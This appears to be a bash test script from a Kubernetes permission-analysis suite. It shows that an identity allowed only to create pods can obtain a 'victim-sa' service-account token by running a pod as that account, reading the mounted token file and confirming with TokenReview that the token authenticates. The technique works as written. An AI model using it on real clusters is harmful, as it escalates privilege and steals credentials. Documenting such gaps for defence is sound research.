#!/usr/bin/env bash
# Implicit permission: create Pod -> create serviceaccounts/token  (pod-create-mints-sa-token)
#
# Proof: an identity granted ONLY `create pods` holds NEITHER `create
# serviceaccounts` NOR `create serviceaccounts/token`, yet by creating a Pod
# with a projected serviceAccountToken volume the kubelet calls the TokenRequest
# API and mints a bound JWT for the Pod's ServiceAccount -- i.e. `create Pod`
# implicitly exercises `create serviceaccounts/token` on the chosen SA. The
# mounted token IS that SA's live credential.
# Mechanism: ../transitions/pod-create-mints-sa-token.md
#   when: resource.namespace == resource1.namespace
#         && resource.name == resource1.serviceAccountRef
source "$(dirname "$0")/../lib.sh"
test_start "pod-create-mints-sa-token"

ns="$(new_ns pod-mint)"

# A target ServiceAccount whose token the attacker will cause to be minted.
step "admin creates ServiceAccount 'victim-sa'"
mk_sa "$ns" victim-sa

# Attacker identity: ONLY `create pods` (plus get pods). Deliberately NOT
# `create serviceaccounts` and NOT the `serviceaccounts/token` subresource.
mk_sa "$ns" attacker
grant_ns "$ns" attacker "" "pods" "create,get,list"
subj="$(sa_subject "$ns" attacker)"

# THE GAP: the attacker holds p (create pods) but cannot mint tokens directly.
assert_can    "$subj" create pods                        "$ns"
assert_cannot "$subj" create serviceaccounts             "$ns"
assert_cannot "$subj" create serviceaccounts/token       "$ns"

# ACT (as attacker, exercising ONLY p): author a Pod running as victim-sa with a
# projected serviceAccountToken volume -- this is what triggers the TokenRequest.
step "attacker creates a Pod (serviceAccountName=victim-sa) with a projected token"
as_subj "$subj" -n "$ns" apply -f - >/dev/null <<EOF || fail "attacker could not create the pod"
apiVersion: v1
kind: Pod
metadata: { name: minter }
spec:
  serviceAccountName: victim-sa
  containers:
  - name: c
    image: ${IMG}
    imagePullPolicy: IfNotPresent
    command: ["sh","-c","sleep 3600"]
EOF

# EFFECT: the kubelet minted a bound token for victim-sa and projected it into
# the pod at the default path. It must be a JWT whose subject is victim-sa.
# Observed as admin via exec; the attacker never held create .../token.
wait_pod_running "$ns" minter 90
tok="$(K -n "$ns" exec minter -- cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)"
assert_nonempty "$tok" "projected SA token present at the default mount path"
# A JWT has three dot-separated parts.
nparts="$(echo "$tok" | awk -F. '{print NF}')"
assert_eq "$nparts" "3" "mounted token is a three-part JWT"
payload="$(echo "$tok" | cut -d. -f2)"
pad=$(( (4 - ${#payload} % 4) % 4 )); payload="${payload}$(printf '=%.0s' $(seq 1 $pad))"
claims="$(echo "$payload" | tr '_-' '/+' | base64 -d 2>/dev/null)"
assert_contains "$claims" "serviceaccount" "JWT is a kubernetes serviceaccount token"
assert_contains "$claims" "victim-sa" "JWT subject is SA 'victim-sa' -- minted via create pods"
# Confirm the apiserver accepts it as victim-sa's live credential (TokenReview).
rev="$(K create -o jsonpath='{.status.user.username}' -f - <<EOF 2>/dev/null
{"apiVersion":"authentication.k8s.io/v1","kind":"TokenReview","spec":{"token":"$tok"}}
EOF
)"
assert_eq "$rev" "system:serviceaccount:$ns:victim-sa" "apiserver authenticates the token AS victim-sa"
step "create pods minted victim-sa's bound token (apiserver authenticates it as $rev) without create .../token"

test_pass
